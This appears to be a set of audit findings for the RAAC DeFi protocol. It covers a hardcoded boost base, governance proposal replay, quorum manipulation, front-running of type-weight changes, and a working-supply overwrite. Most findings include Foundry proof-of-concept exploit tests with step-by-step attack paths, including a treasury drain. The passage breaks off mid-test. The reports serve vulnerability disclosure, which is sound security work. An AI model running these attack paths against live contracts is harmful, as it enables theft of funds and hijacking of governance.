## [M-02] hardcoded baseamount in `Updateuserboost` fucntion causes users with small token holdings to receive higher boosts relative to their holdings.
### Description

In the BoostController.sol contract there is a hardcoded base amount (10000) in the updateUserBoost() function which leads to disproportionate boost allocations. This allows users with small token holdings to receive significantly higher boosts relative to their holdings than larger token holders, breaking the intended boost distribution mechanism.

Vulnerability Details
Vulnerable Code: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/boost/BoostController.sol#L177
```solidity 
function updateUserBoost(address user, address pool) external override nonReentrant whenNotPaused {
    // ...
    uint256 newBoost = _calculateBoost(user, pool, 10000); //audit:  Hardcoded base amount
    // ...
}
```
### Execution Flow:

User calls updateUserBoost()

Function calls _calculateBoost() with hardcoded value 10000.

3. Boost is calculated without proper scaling to user's token holdings

Results in disproportionate boost allocation

POC: Create a test file and add this poc and run it
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test} from "forge-std/Test.sol";
import {BoostController} from "../../../../../contracts/core/governance/boost/BoostController.sol";
import {veRAACToken} from "../../../../../contracts/core/tokens/veRAACToken.sol";
import {RAACToken} from "../../../../../contracts/core/tokens/RAACToken.sol";
​
contract BoostControllerHardcodedBaseTest is Test {
    BoostController public boostController;
    veRAACToken public veToken;
    RAACToken public raacToken;
    
    address public attacker = address(0x1);
    address public legitUser = address(0x2);
    address public pool = address(0x3);
    address public owner = address(this);
​
    function setUp() public {
        // Deploy contracts
        raacToken = new RAACToken(owner, 100, 50);
        veToken = new veRAACToken(address(raacToken));
        boostController = new BoostController(address(veToken));
        
        // Setup permissions
        boostController.modifySupportedPool(pool, true);
        raacToken.setMinter(owner);
        
        // Mint RAAC tokens to users
        raacToken.mint(attacker, 100e18);    // Attacker gets 100 tokens
        raacToken.mint(legitUser, 10000e18); // Legitimate user gets 10000 tokens
        
        // Whitelist addresses
        raacToken.manageWhitelist(attacker, true);
        raacToken.manageWhitelist(legitUser, true);
        raacToken.manageWhitelist(address(veToken), true);
    }
​
    function testHardcodedBaseVulnerability() public {
        // Users lock tokens
        vm.startPrank(legitUser);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(10000e18, 365 days); // Lock 10000 tokens
        vm.stopPrank();
​
        vm.startPrank(attacker);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(100e18, 365 days);  // Lock 100 tokens
        vm.stopPrank();
​
        // Update boosts
        vm.prank(legitUser);
        boostController.updateUserBoost(legitUser, pool);
        (uint256 legitUserBoost, , , ) = boostController.getUserBoost(legitUser, pool);
​
        vm.prank(attacker);
        boostController.updateUserBoost(attacker, pool);
        (uint256 attackerBoost, , , ) = boostController.getUserBoost(attacker, pool);
​
        // Calculate boost per token
        uint256 attackerBoostPerToken = (attackerBoost * 1e18) / veToken.balanceOf(attacker);
        uint256 legitUserBoostPerToken = (legitUserBoost * 1e18) / veToken.balanceOf(legitUser);
​
        // Verify attacker gets more boost per token
        assertGt(
            attackerBoostPerToken,
            legitUserBoostPerToken,
            "Attacker gets more boost per token"
        );
​
        // Verify boost ratio vs token ratio
        uint256 boostRatio = (attackerBoost * 100) / legitUserBoost;      // ~40%
        uint256 tokenRatio = (veToken.balanceOf(attacker) * 100) / veToken.balanceOf(legitUser); // ~1%
​
        assertGt(
            boostRatio,
            tokenRatio * 20,
            "Attacker gets disproportionate boost relative to holdings"
        );
​
        // Calculate rewards
        uint256 dailyRewards = 1000e18;
        uint256 totalBoost = attackerBoost + legitUserBoost;
        
        uint256 attackerRewards = (attackerBoost * dailyRewards) / totalBoost;
        uint256 legitUserRewards = (legitUserBoost * dailyRewards) / totalBoost;
​
        // Calculate reward efficiency (rewards per token held)
        uint256 attackerRewardEfficiency = (attackerRewards * 1e18) / veToken.balanceOf(attacker);
        uint256 legitUserRewardEfficiency = (legitUserRewards * 1e18) / veToken.balanceOf(legitUser);
​
        assertGt(
            attackerRewardEfficiency,
            legitUserRewardEfficiency,
            "Attacker gets more rewards per token held"
        );
​
        // Verify the core issue - small holder gets close to base amount boost
        assertGt(
            attackerBoost,
            10000,
            "Even small holder gets more than base amount"
        );
    }
} 
```

### Impact
Economic Impact:

Small holders receive disproportionately high boosts

Large holders get diminished returns on their holdings

Reward distribution becomes unfair

   Attacker (100 tokens):
   - Gets ~40% of boost power
   - Receives ~40% of rewards
   
   Legitimate User (10000 tokens):
   - Has 100x more tokens
   - But only gets ~2.5x more boost power
Undermines the incentive to hold large amounts of tokens

Creates unfair advantage for small holders

Could lead to gaming of the boost system

// Easy to exploit:
1. Get minimum tokens (100)
2. Call updateUserBoost()
3. Get disproportionate boost due to hardcoded 10000
4. Receive ~40% rewards while only holding 1% tokens
Tools Used
### Recommendations
Use the userbalance instead of using an hardcoded amount .


## [M-03] Replay Attack vul in `Goverance.sol`
### Description

In governance.sol contract system, identical proposal operations can be executed multiple times by creating different proposals with the same parameters. This is possible because the operation hash in TimelockController.sol is derived from both operation parameters and a salt based on proposalId, allowing replay attacks through different proposalIds.

This stems from insufficient operation uniqueness validation - while the timelock prevents replaying the exact same operation hash, it fails to detect when the same underlying operation is executed with a different salt. This could allow malicious actors to drain protocol funds or execute critical operations multiple times.

### Vulnerability Details
The Core Issue
In Governance.sol:
```solidity 
function execute(uint256 proposalId) external nonReentrant {
    // Salt generated from proposalId
    bytes32 salt = keccak256(abi.encode(proposalId));
    
    // Operation hash includes salt
    bytes32 id = _timelock.hashOperationBatch(
        proposal.targets,
        proposal.values,
        proposal.calldatas,
        bytes32(0),
        salt  // Different proposalId = different hash
    );
​
    if (!_timelock.isOperationPending(id)) {
        _timelock.scheduleBatch(...);
    }
    if (_timelock.isOperationReady(id)) {
        _timelock.executeBatch(...);
    }
}
```

The vulnerability arises because:

Operation uniqueness relies solely on operation hash

Hash includes proposalId-based salt

Same operation parameters with different proposalIds create different hashes

No validation of duplicate operation parameters

Timelockcontroller.sol treats each hash as unique operation

### Proof of Code:
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../../../../contracts/core/governance/proposals/Governance.sol";
import "../../../../../contracts/core/governance/proposals/TimelockController.sol";
import "../../../../../contracts/interfaces/core/governance/proposals/IGovernance.sol";
import "../../../../../contracts/interfaces/core/tokens/IveRAACToken.sol";
import "../../../../../contracts/core/tokens/veRAACToken.sol";
​
contract MockRAACToken is ERC20 {
    constructor() ERC20("RAAC", "RAAC") {
        _mint(msg.sender, 10_000_000e18);
    }
}
​
contract GovernanceTest is Test {
    Governance public governance;
    TimelockController public timelock;
    veRAACToken public veToken;
    MockRAACToken public raacToken;
​
    address public admin = address(this);
    address public attacker = makeAddr("attacker");
    address[] public attackerAccounts;
    uint256 constant NUM_ACCOUNTS = 5;
​
    function setUp() public {
        raacToken = new MockRAACToken();
        veToken = new veRAACToken(address(raacToken));
        
        address[] memory proposers = new address[](1);
        address[] memory executors = new address[](1);
        proposers[0] = admin;
        executors[0] = admin;
        
        timelock = new TimelockController(2 days, proposers, executors, admin);
        governance = new Governance(address(veToken), address(timelock));
​
        timelock.grantRole(timelock.PROPOSER_ROLE(), address(governance));
        timelock.grantRole(timelock.EXECUTOR_ROLE(), address(governance));
​
        // Create multiple attacker accounts
        for(uint i = 0; i < NUM_ACCOUNTS; i++) {
            attackerAccounts.push(makeAddr(string.concat("attacker", vm.toString(i))));
            // Give each account enough tokens for their larger lock amount
            uint256 accountTokens = 200_000e18 * (i + 1);
            raacToken.transfer(attackerAccounts[i], accountTokens);
        }
​
        // Give extra tokens to attacker0 for the proposal
        raacToken.transfer(attackerAccounts[0], 500_000e18);
​
        // Label accounts for better trace readability
        vm.label(attackerAccounts[1], "legitimateUser");
        vm.label(attackerAccounts[0], "attacker");
    }
​
    function testGovernanceReplayViaProposalId() public {
        vm.startPrank(attackerAccounts[0]);
        raacToken.approve(address(veToken), 500_000e18);
        veToken.lock(500_000e18, 1460 days);
        vm.deal(address(timelock), 2 ether);
​
        // Setup identical operation parameters
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        
        targets[0] = attackerAccounts[0];
        values[0] = 1 ether;
        calldatas[0] = "";
​
        // Create first proposal - will use proposalId 0 for salt
        uint256 proposalId1 = governance.propose(
            targets,
            values,
            calldatas,
            "First Transfer",
            IGovernance.ProposalType.TreasuryAction
        );
​
        // Create second proposal - will use proposalId 1 for salt
        uint256 proposalId2 = governance.propose(
            targets,
            values,
            calldatas,
            "Second Transfer", 
            IGovernance.ProposalType.TreasuryAction
        );
​
        // Show different operation hashes due to different proposalIds
        bytes32 salt1 = keccak256(abi.encode(proposalId1));
        bytes32 salt2 = keccak256(abi.encode(proposalId2));
        
        bytes32 opHash1 = timelock.hashOperationBatch(
            targets, values, calldatas, bytes32(0), salt1
        );
        bytes32 opHash2 = timelock.hashOperationBatch(
            targets, values, calldatas, bytes32(0), salt2
        );
        
        assertTrue(opHash1 != opHash2, "Operation hashes should differ due to proposalId");
​
        // Execute both proposals
        vm.warp(block.timestamp + governance.votingDelay() + 1);
        governance.castVote(proposalId1, true);
        governance.castVote(proposalId2, true);
        vm.warp(block.timestamp + governance.votingPeriod());
​
        // Execute first proposal
        governance.execute(proposalId1);
        vm.warp(block.timestamp + timelock.getMinDelay());
        governance.execute(proposalId1);
​
        uint256 firstBalance = attackerAccounts[0].balance;
        assertEq(firstBalance, 1 ether, "First transfer failed");
​
        // Execute second proposal with same parameters
        governance.execute(proposalId2);
        vm.warp(block.timestamp + timelock.getMinDelay());
        governance.execute(proposalId2);
​
        uint256 finalBalance = attackerAccounts[0].balance;
        assertEq(finalBalance, 2 ether, "Replay via different proposalId failed");
        
        vm.stopPrank();
    }
} 
```

Attack Path
Attacker creates first proposal:
```solidity 
// First proposal to transfer 1 ETH
proposalId1 = governance.propose(
    [attacker],     // target
    [1 ether],      // value
    [""],           // calldata
    "First Transfer"
);
Creates second identical proposal:

// Second proposal with same parameters
proposalId2 = governance.propose(
    [attacker],     // Same target
    [1 ether],      // Same value 
    [""],           // Same calldata
    "Second Transfer"
);
Different hashes generated:

// First operation hash
salt1 = keccak256(abi.encode(proposalId1));
opHash1 = timelock.hashOperationBatch(
    targets, values, calldatas, bytes32(0), salt1
);
​
// Second operation hash (different due to proposalId)
salt2 = keccak256(abi.encode(proposalId2)); 
opHash2 = timelock.hashOperationBatch(
    targets, values, calldatas, bytes32(0), salt2
);
Both proposals can be executed:

// Execute first transfer
governance.execute(proposalId1);
// Wait timelock delay
governance.execute(proposalId1);  // Transfers 1 ETH
​
// Execute second transfer
governance.execute(proposalId2);
// Wait timelock delay  
governance.execute(proposalId2);  // Transfers another 1 ETH
```

### Impact
Protocol funds can be drained through repeated transfers

Critical operations can be executed multiple times

Governance decisions can be replayed

No limit on number of replays possible

Breaks timelock security assumptions

Treasury Drain

Attacker creates multiple proposals to transfer funds

Each proposal uses same parameters but different ID

Successfully drains treasury through repeated transfers

Parameter Changes

Critical protocol parameters can be changed multiple times

Each change appears as unique operation to timelock

Could destabilize protocol through repeated modifications

Tools Used
## Recommendations
Use Nonce-Based Salt:

Add Parameter Validation:
```solidity 
function propose(
    address[] memory targets,
    uint256[] memory values,
    bytes[] memory calldatas
) external returns (uint256) {
    bytes32 paramsHash = keccak256(abi.encode(targets, values, calldatas));
    require(!_proposalsByParams[paramsHash], "Duplicate proposal");
    // Rest of propose function...
}
```

## [M-04] Cordinated group of attacker can artificially lower quorum threshold during active proposals forcing malicious proposals to pass without true majority support
### Description

A critical timing-based vulnerability exists in governance.sol system that allows malicious actors to manipulate voting quorums through coordinated token withdrawals.

It allows malicious actors to manipulate the quorum requirements for proposal voting. The vulnerability stems from the dynamic calculation of quorum based on total voting power, combined with the ability to coordinate token withdrawals after lock expiry. This enables attackers to artificially lower the quorum threshold during an active proposal's voting period, potentially allowing minority stakeholders to pass malicious proposals without true majority support.

The attack exploits the interaction between the veRAACToken's withdrawal mechanism and the Governance.sol quorum calculation, demonstrating how governance systems with dynamic quorum requirements can be vulnerable to timing-based manipulation attacks.

The vulnerability stems from three key design choices:

Dynamic quorum calculation based on total voting power

Ability to withdraw locked tokens after expiry

No quorum freezing mechanism during active proposals

Through detailed testing (testTimingAttackOnQuorum), i have dome my best to demonstrat how attackers can artificially lower the quorum requirement mid-proposal by coordinating withdrawals after lock expiry. This enables a minority stakeholder to pass proposals that would otherwise require significantly more support.

The proof of concept shows an attack reducing the quorum from 14,000e18 to 6,000e18 tokens, allowing a proposal to pass with just 99,726e18 votes - far less than what would have been required under the initial quorum.

Vulnerability Details
Quorum Calculation: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/proposals/Governance.sol#L353

```solidity 
function quorum() public view returns (uint256) {
    uint256 totalVotingPower = _veToken.getTotalVotingPower();
    return totalVotingPower * QUORUM_PERCENTAGE / 100;  // Dynamic calculation
}
```
Multiple coordinating attacker token holders

Patience to wait for lock expiry

Sufficient initial voting power to meet reduced quorum

Timing coordination for withdrawals

### Proof of code;

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../../../../contracts/core/governance/proposals/Governance.sol";
import "../../../../../contracts/core/governance/proposals/TimelockController.sol";
import "../../../../../contracts/interfaces/core/governance/proposals/IGovernance.sol";
import "../../../../../contracts/interfaces/core/tokens/IveRAACToken.sol";
import "../../../../../contracts/core/tokens/veRAACToken.sol";
import "../../../../../contracts/core/tokens/RAACToken.sol";
​
contract GovernanceTest is Test {
    Governance public governance;
    TimelockController public timelock;
    veRAACToken public veToken;
    RAACToken public raacToken;
​
    address public admin = address(this);
    address public attacker = makeAddr("attacker");
    address[] public attackerAccounts;
    uint256 constant NUM_ACCOUNTS = 5;
​
    function setUp() public {
        // Deploy real RAAC token
        raacToken = new RAACToken(
            admin,      // initial owner
            100,        // 1% swap tax
            50          // 0.5% burn tax
        );
        
        // Set up minter role and mint initial tokens
        raacToken.setMinter(address(this));
        
        // Mint enough tokens for all test cases
        raacToken.mint(address(this), 10_000_000e18); // 10M tokens for distribution
        
        veToken = new veRAACToken(address(raacToken));
        
        address[] memory proposers = new address[](1);
        address[] memory executors = new address[](1);
        proposers[0] = admin;
        executors[0] = admin;
        
        timelock = new TimelockController(2 days, proposers, executors, admin);
        governance = new Governance(address(veToken), address(timelock));
​
        timelock.grantRole(timelock.PROPOSER_ROLE(), address(governance));
        timelock.grantRole(timelock.EXECUTOR_ROLE(), address(governance));
​
        // Whitelist addresses to avoid tax
        raacToken.manageWhitelist(address(this), true);
        raacToken.manageWhitelist(address(veToken), true);
​
        // Create multiple attacker accounts
        for(uint i = 0; i < NUM_ACCOUNTS; i++) {
            attackerAccounts.push(makeAddr(string.concat("attacker", vm.toString(i))));
            // Whitelist and give tokens
            raacToken.manageWhitelist(attackerAccounts[i], true);
            raacToken.transfer(attackerAccounts[i], 200_000e18 * (i + 1));
        }
​
        // Give extra tokens to attacker0 for the proposal
        raacToken.transfer(attackerAccounts[0], 500_000e18);
​
        // Label accounts for better trace readability
        vm.label(attackerAccounts[1], "legitimateUser");
        vm.label(attackerAccounts[0], "attacker");
    }
​
  
function testTimingAttackOnQuorum() public {
        // Setup multiple attackers with significant voting power
        for(uint i = 0; i < NUM_ACCOUNTS; i++) {
            vm.startPrank(attackerAccounts[i]);
            raacToken.approve(address(veToken), 200_000e18);
            veToken.lock(200_000e18, 365 days);
            vm.stopPrank();
        }
​
        // Give attacker0 extra voting power to meet proposal threshold
        vm.startPrank(attackerAccounts[0]);
        raacToken.approve(address(veToken), 400_000e18); // Additional 400k tokens
        veToken.lock(400_000e18, 365 days);             // This will give +100k voting power
        vm.stopPrank();
​
        // Create proposal
        vm.startPrank(attackerAccounts[0]);
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        
        uint256 proposalId = governance.propose(
            targets,
            values,
            calldatas,
            "Timing Attack Proposal",
            IGovernance.ProposalType.TreasuryAction
        );
        vm.stopPrank();
​
        uint256 initialQuorum = governance.quorum();
        console.log("Initial quorum requirement:", initialQuorum);
​
        // Move to voting period
        vm.warp(block.timestamp + governance.votingDelay() + 1);
​
        // Only attacker votes
        vm.prank(attackerAccounts[0]);
        governance.castVote(proposalId, true);
​
        // Fast forward past lock expiry (365 days + 1)
        vm.warp(block.timestamp + 366 days);
        
        // Now other attckers can unlock their tokens
        for(uint i = 1; i < NUM_ACCOUNTS; i++) {
            vm.prank(attackerAccounts[i]);
            veToken.withdraw(); // Should work now since lock expired
        }
​
        // Check final quorum
        uint256 finalQuorum = governance.quorum();
        console.log("Final reduced quorum:", finalQuorum);
        assertTrue(finalQuorum < initialQuorum, "Quorum should be reduced");
​
        // Move past voting period
        vm.warp(block.timestamp + governance.votingPeriod() + 1);
​
        // Verify attack success
        (uint256 forVotes, uint256 againstVotes) = governance.getVotes(proposalId);
        assertTrue(
            forVotes >= finalQuorum,
            "Proposal passes with manipulated quorum"
        );
​
        IGovernance.ProposalState state = governance.state(proposalId);
        assertTrue(
            state == IGovernance.ProposalState.Succeeded,
            "Proposal should succeed through timing attack"
        );
    }
} 
```

Technical Deep Dive
Initial State Setup:

// Multiple attackers lock tokens
for(uint i = 0; i < NUM_ACCOUNTS; i++) {
    vm.startPrank(attackerAccounts[i]);
    raacToken.approve(address(veToken), 200_000e18);
    veToken.lock(200_000e18, 365 days);  // Each account locks 200k tokens
    vm.stopPrank();
}
​
// Attacker gets extra voting power
vm.startPrank(attackerAccounts[0]);
raacToken.approve(address(veToken), 400_000e18);
veToken.lock(400_000e18, 365 days);     // Attacker locks additional 400k tokens
vm.stopPrank();
Initial State:

Total Voting Power: 350,000e18

Quorum Requirement (4%): 14,000e18

Attacker Voting Power: ~100,000e18

Attack Execution Flow:
```solidity 
// Step 1: Create proposal
proposalId = governance.propose(
    targets,
    values,
    calldatas,
    "Timing Attack Proposal",
    IGovernance.ProposalType.TreasuryAction
);
​
// Step 2: Attacker votes
vm.prank(attackerAccounts[0]);
governance.castVote(proposalId, true);  // ~100k votes
​
// Step 3: Wait for lock expiry
vm.warp(block.timestamp + 366 days);
​
// Step 4: Coordinated attack withdrawals
for(uint i = 1; i < NUM_ACCOUNTS; i++) {
    vm.prank(attackerAccounts[i]);
    veToken.withdraw();  // Each withdrawal reduces total voting power
}
```
Final State:

Reduced Total Voting Power: 150,000e18

New Quorum Requirement: 6,000e18

Attacker's Votes: 99,726e18 (Now sufficient to pass)

### Impact
A malicious actor can unilaterally pass governance proposals by coordinating token withdrawals to artificially lower the quorum from 14,000e18 to 6,000e18 tokens, and complete governance control with only ~100k votes instead of the intended higher threshold.

Take control of governance

Bypass intended democratic processes

Achieve this with far fewer votes than should be required

Tools Used
### Recommendations
Freeze Quorum at Proposal Creation

Implement Withdrawal Restrictions


## [M-05] Attackers can front-run calls to `setTypeWeight` to gain extra voting power.
### Description

In GaugeController.sol contract there is a vul that allows attackers to front-run setType weight changes to amplify their voting power significantly. It is from the lack of synchronization between type weight updates and vote modifications, allowing attackers to strategically time their voting actions around administrative type weight changes.

My POC demonstrates that an attacker with just 100 voting power units can amplify their effective voting power by 80x (from 10 to 800) by front-running a type weight change from 10% to 80%. This manipulation severely undermines the democratic governance process and allows attackers to gain disproportionate influence over the protocol with minimal capital commitment.

Under normal conditions, changes to type weights should affect all voters equally, maintaining proportional representation. However, this vulnerability allows attackers to game the system by temporarily withdrawing their votes before a type weight increase and re-applying them afterward, gaining significantly more voting power than intended.

### Vulnerability Details
The vulnerability exists in the interaction between several key functions in GaugeController.sol:

Vote Weight Calculation: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/GaugeController.sol#L190

```solidity 
function vote(address gauge, uint256 weight) external {
    if (!isGauge(gauge)) revert GaugeNotFound();
    if (weight > getVotingPower(msg.sender)) revert InsufficientVotingPower();
​
  //audit_ issue: lacks validation of vote-delay 
    userGaugeVotes[msg.sender][gauge] = weight;
    // ... weight updates ...
}
```

Type Weight Setting: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/GaugeController.sol#L342

```solidity 
function setTypeWeight(GaugeType gaugeType, uint256 weight) external {
    if (!hasRole(GAUGE_ADMIN, msg.sender)) revert UnauthorizedCaller();
    if (weight > MAX_TYPE_WEIGHT) revert InvalidWeight();
    
    typeWeights[gaugeType] = weight;
    emit TypeWeightUpdated(gaugeType, weight);
}
```


Weight Calculation: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/gauges/GaugeController.sol#L468

```solidity 
function getGaugeWeight(address gauge) public view returns (uint256) {
    return gauges[gauge].weight;
}
```

### Proof of code: Add this code to a testfile and run it

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "../../../../../contracts/interfaces/core/governance/gauges/IGaugeController.sol";
import "../../../../../contracts/interfaces/core/governance/gauges/IGauge.sol";
import "../../../../../contracts/core/governance/gauges/GaugeController.sol";
import "../../../../../contracts/libraries/math/TimeWeightedAverage.sol";
import "../../../../../contracts/libraries/governance/BoostCalculator.sol";
import "forge-std/Test.sol";
​
contract GaugeControllerTest is Test {
    using TimeWeightedAverage for TimeWeightedAverage.Period;
    using BoostCalculator for BoostCalculator.BoostState;
​
    GaugeController public controller;
    address public veToken;
    address public gauge;
    address public attacker;
    address public admin;
​
    function setUp() public {
        veToken = makeAddr("veToken");
        controller = new GaugeController(veToken);
        
        admin = address(this);
        attacker = makeAddr("attacker");
        gauge = makeAddr("gauge");
​
        // Mock veToken balance calls
        vm.mockCall(
            veToken,
            abi.encodeWithSelector(IERC20.balanceOf.selector, attacker),
            abi.encode(100 * 1e18)
        );
​
        vm.mockCall(
            veToken,
            abi.encodeWithSelector(IERC20.totalSupply.selector),
            abi.encode(1000 * 1e18)
        );
        
        // Admin adds new gauge with initial weight
        controller.addGauge(gauge, IGaugeController.GaugeType.RWA, 1000);
    }
​
    function testFrontRunningAttack() public {
        // Initial setup - attacker has 100 voting power
        uint256 ATTACKER_VOTING_POWER = 100;
        vm.mockCall(
            veToken,
            abi.encodeWithSelector(IERC20.balanceOf.selector, attacker),
            abi.encode(ATTACKER_VOTING_POWER)
        );
​
        // Start with low type weight
        controller.setTypeWeight(IGaugeController.GaugeType.RWA, 1000); // 10%
​
        // Initial state - attacker votes with their full power
        vm.startPrank(attacker);
        controller.vote(gauge, ATTACKER_VOTING_POWER);
        vm.stopPrank();
​
        console.log("\nInitial state:");
        console.log("Initial type weight:", controller.getTypeWeight(IGaugeController.GaugeType.RWA));
        console.log("Initial gauge weight:", controller.getGaugeWeight(gauge));
        console.log("Initial effective power:", controller.getGaugeWeight(gauge) * controller.getTypeWeight(IGaugeController.GaugeType.RWA) / controller.MAX_TYPE_WEIGHT());
        
        // Step 1: Attacker front-runs by removing their vote
        vm.startPrank(attacker);
        controller.vote(gauge, 0);
        vm.stopPrank();
        
        // Step 2: Admin increases type weight significantly
        vm.startPrank(admin);
        controller.setTypeWeight(IGaugeController.GaugeType.RWA, 8000); // 80%
        vm.stopPrank();
        
        // Step 3: Attacker back-runs by voting again
        vm.startPrank(attacker);
        controller.vote(gauge, ATTACKER_VOTING_POWER);
        vm.stopPrank();
​
        uint256 finalEffectivePower = controller.getGaugeWeight(gauge) * controller.getTypeWeight(IGaugeController.GaugeType.RWA) / controller.MAX_TYPE_WEIGHT();
        uint256 initialEffectivePower = ATTACKER_VOTING_POWER * 1000 / controller.MAX_TYPE_WEIGHT(); // Initial power with 10% type weight
​
        console.log("\nAttack Results:");
        console.log("Initial effective power:", initialEffectivePower);
        console.log("Final effective power:", finalEffectivePower);
        console.log("Power multiplier gained:", finalEffectivePower / initialEffectivePower);
​
        assertTrue(
            finalEffectivePower > initialEffectivePower * 2, 
            "Attack failed - voting power not significantly increased"
        );
    }
}
```

### Attack flow:

Attacker has 100 voting power units
Initial type weight is set to 1000 (10%) for RWA gauge type
Attacker initially votes with full power
​
​
 Attacker monitors mempool for type weight changes
 Removes vote completely
 Admin increases type weight significantly
 80%
 Attacker quickly re-applies vote after weight change
 Re-votes with same power
​
Attack Results:
Initial effective power: 10 (100 * 10%)
Final effective power: 800 (100 * 80%)
Power multiplier gained: 80x
​
   
### Impact
Governance Manipulation:

Attackers can gain disproportionate voting power

Tools Used
### Recommendations
GuageController has a VOTE DELAY but never uses it.

Add this as it would hinder a user from voting and unvoting immediately
```solidity 
 mapping(address => uint256) public lastVoteTime;
    /// @notice Required delay between votes
    uint256 public constant VOTE_DELAY = 10 days;
    /// @notice Minimum allowed vote delay
​```
​
​
-----------------------------------------------------

```solidity 
    function vote(address gauge, uint256 weight) external override whenNotPaused { 
        if (!isGauge(gauge)) revert GaugeNotFound();
        if (weight > WEIGHT_PRECISION) revert InvalidWeight();  
        
        uint256 votingPower = veRAACToken.balanceOf(msg.sender);
        if (votingPower == 0) revert NoVotingPower();
 
        uint256 oldWeight = userGaugeVotes[msg.sender][gauge];
        userGaugeVotes[msg.sender][gauge] = weight;
        
        _updateGaugeWeight(gauge, oldWeight, weight, votingPower);
        
        emit WeightUpdated(gauge, oldWeight, weight);
    }
```


## [M-06] Workingsupply would always be overwritten in `boostcontroller.sol` impacting reward calculations
### Description

In the BoostController.sol updateUserBoost() function, the working supply is incorrectly overwritten instead of being properly accumulated. This leads to a situation where the pool's working supply becomes less than the sum of individual user boosts, potentially impacting reward distributions and boost mechanics.

### Vulnerability Details
The vulnerability exists in the updateUserBoost() function where the working supply is directly set to the new boost amount instead of being properly accumulated: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/boost/BoostController.sol#L177

 
  ```solidity    
    function updateUserBoost(address user, address pool) external override nonReentrant whenNotPaused {
        if (paused()) revert EmergencyPaused();
        if (user == address(0)) revert InvalidPool(); 
        if (!supportedPools[pool]) revert PoolNotSupported();
        
        UserBoost storage userBoost = userBoosts[user][pool];
        PoolBoost storage poolBoost = poolBoosts[pool];
        
        uint256 oldBoost = userBoost.amount;
        // Calculate new boost based on current veToken balance
        uint256 newBoost = _calculateBoost(user, pool, 10000);
        
        userBoost.amount = newBoost;
        userBoost.lastUpdateTime = block.timestamp;
        
        // Update pool totals safely
        if (newBoost >= oldBoost) {
            poolBoost.totalBoost = poolBoost.totalBoost + (newBoost - oldBoost);
        } else {
            poolBoost.totalBoost = poolBoost.totalBoost - (oldBoost - newBoost);
        }
        poolBoost.workingSupply = newBoost; // audit - Seting working supply directly to new boost. Vulnerable line 
        poolBoost.lastUpdateTime = block.timestamp;
        
        emit BoostUpdated(user, pool, newBoost);
        emit PoolBoostUpdated(pool, poolBoost.totalBoost, poolBoost.workingSupply);

```

##The function flow:

User calls updateUserBoost()

Old boost amount is stored

New boost is calculated based on veToken balance

Total boost is correctly updated by adding/subtracting the difference

Working supply is incorrectly overwritten with just the new boost amount

When multiple users update their boosts:

First user (Bob) updates → working supply becomes Bob's boost amount

Second user (Alice) updates → working supply becomes Alice's boost amount

Bob's contribution is completely lost from working supply

This creates a "last writer wins" scenario where only the most recent updater's boost is reflected in the working supply.

### Proof of Concept
Test Flow:

Initial setup with Alice having 1000 tokens and Bob having 5000 tokens

Bob updates his boost first

Alice updates her boost second

Working supply is verified to be less than sum of individual boosts

### Key Observations:

After Bob's update: Working supply = Bob's boost amount

After Alice's update: Working supply = Alice's boost amount

Final working supply < (Bob's boost + Alice's boost)

Creaete a test file and add this code to it :

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {BoostController} from "../../../../../contracts/core/governance/boost/BoostController.sol";
import {veRAACToken} from "../../../../../contracts/core/tokens/veRAACToken.sol";
import {RAACToken} from "../../../../../contracts/core/tokens/RAACToken.sol";
​
contract BoostControllerTest is Test {
    BoostController public boostController;
    veRAACToken public veToken;
    RAACToken public raacToken;
    
    address public alice = address(0x1);
    address public bob = address(0x2);
    address public pool = address(0x3);
    address public owner = address(this);
​
    function setUp() public {
        // Deploy real RAAC token with initial parameters
        raacToken = new RAACToken(
            owner,      // initial owner
            100,        // 1% swap tax
            50          // 0.5% burn tax
        );
        
        // Deploy veToken
        veToken = new veRAACToken(address(raacToken));
        
        // Deploy BoostController
        boostController = new BoostController(address(veToken));
        
        // Setup roles and permissions
        boostController.modifySupportedPool(pool, true);
        raacToken.setMinter(owner);
        
        // Mint tokens to users
        raacToken.mint(alice, 1000e18);
        raacToken.mint(bob, 5000e18);
        
        // Whitelist users to avoid tax on transfers
        raacToken.manageWhitelist(alice, true);
        raacToken.manageWhitelist(bob, true);
        raacToken.manageWhitelist(address(veToken), true);
        
        // Setup users
        vm.startPrank(alice);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(1000e18, 365 days); // Lock for 1 year
        vm.stopPrank();
        
        vm.startPrank(bob);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(5000e18, 365 days); // Lock for 1 year
        vm.stopPrank();
    }
​
    function testWorkingSupplyOverwrite() public {
        // Initial state
        console2.log("Initial state:");
        console2.log("Alice veToken balance:", veToken.balanceOf(alice));
        console2.log("Bob veToken balance:", veToken.balanceOf(bob));
​
        // Step 1: Bob updates his boost first
        vm.prank(bob);
        boostController.updateUserBoost(bob, pool);
        
        // Get Bob's boost info
        (uint256 bobBoostAmount, , , ) = boostController.getUserBoost(bob, pool);
